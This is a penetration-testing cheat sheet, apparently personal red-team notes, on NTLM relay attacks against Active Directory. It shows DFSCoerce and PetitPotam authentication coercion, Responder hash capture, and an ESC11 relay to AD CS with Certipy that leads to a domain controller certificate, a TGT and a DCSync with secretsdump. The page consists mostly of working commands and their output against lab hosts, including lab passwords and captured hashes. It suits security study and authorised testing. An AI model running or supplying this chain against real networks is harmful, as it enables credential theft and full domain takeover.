# NTLM\_Relaying

### **DFSCoerce**

Documentation: [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

### MS-DFSNM DFSCoerce

* DFSCoerce abuses the NetrDfsAddStdRoot and NetrDfsRemoveStdRoot methods of Distributed File System (DFS):
* Namespace Management Protocol (MS-DFSNM);
* (DFSCoerce does not seem capable of coercing HTTP NTLM authentication)
* https://github.com/Wh04m1001/DFSCoerce

```
python3 dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' 172.16.117.30 172.16.117.3 
[-] Connecting to ncacn_np:172.16.117.3[\PIPE\netdfs] 
[+] Successfully bound! 
[-] Sending NetrDfsRemoveStdRoot! NetrDfsRemoveStdRoot ServerName: '172.16.117.30\x00' RootShare: 'test\x00' ApiFlags: 1
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

#### Responder

* don't forget to start responder so you can capture the ntlm credential

```
[SMB] NTLMv2-SSP Client : 172.16.117.3 
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$ 
[SMB] NTLMv2-SSP Hash : DC01$::INLANEFREIGHT:e2d2339638fc5fd6:D4979A923DD76BC3CFA418E94958E2B0:010100000000000000E0550D97C<SNIP>
```

### **ESC11**

#### ESCALATION 11

#### NTLM Relay to AD CS ICRP Endpoints

* https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/
  * Good research showing how to take advantage of this issue
* `IF_ENFORCEENCRYPTICERTREQUEST` enforces the encryption of certificate enrollment requests between a client and the CA; The client must encrypt any certificate request it sends to the CA.
* If the CA does not have the flag `IF_ENFORCEENCRYPTICERTREQUEST` set, unencrypted sessions (think relaying coerced SMB NTLM authentication over HTTP) can be used for certificate enrollment.

#### LINUX

#### Find vulnerable servers with Certipy

```
certipy find -u blwasp -p 'Password123!' -dc-ip 172.16.19.3 -vulnerable -stdout 
ESC11 : Encryption is not enforced For ICPR requests and Request Disposition is set to Issue
```

#### Abusing ESC11 with Certipy

```
sudo certipy relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController
```

#### Coerce authentication with PetitPotam

```
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 172.16.19.19 172.16.19.3 
Trying pipe lsarpc 
[-] Connecting to ncacn_np:172.16.19.3[\PIPE\lsarpc] 
[+] Connected! 
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e 
[+] Successfully bound! 
[-] Sending EfsRpcOpenFileRaw! 
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED! 
[+] OK! Using unpatched function! 
[-] Sending EfsRpcEncryptFileSrv! 
[+] Got expected ERROR_BAD_NETPATH exception!! 
[+] Attack worked!
```

* Certipy receiving Authentication from LAB-DC$

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[] Targeting rpc://172.16.19.5 (ESC11) 
[] Listening on 0.0.0.0:445 
[] Connecting to ncacn_ip_tcp:172.16.19.5[135] to determine ICPR stringbinding 
[] Attacking user 'LAB-DC$@DC' 
[] Requesting certificate For user 'LAB-DC$' with template 'DomainController' 
[] Requesting certificate via RPC 
[] Successfully requested certificate 
[] Request ID is 13 
[] Got certificate with DNS Host Name 'lab-dc.lab.local' 
[] Certificate has no object SID 
[] Saved certificate and private key to 'lab-dc.pfx' 
[] Exiting...`
```

* Request a TGT as the Domain Controller

```
certipy auth -pfx lab-dc.pfx
```

* Perform DCSync using the TGT as the Domain Controller

```
KRB5CCNAME=lab-dc.ccache impacket-secretsdump -k -no-pass lab-dc.lab.local
```

* Perform DCSync using the NT Hash as the Domain Controller

```
secretsdump.py 'lab-dc$'@lab-dc.lab.local -hashes :9815073c5e5e718994c4791201f2d93e
```
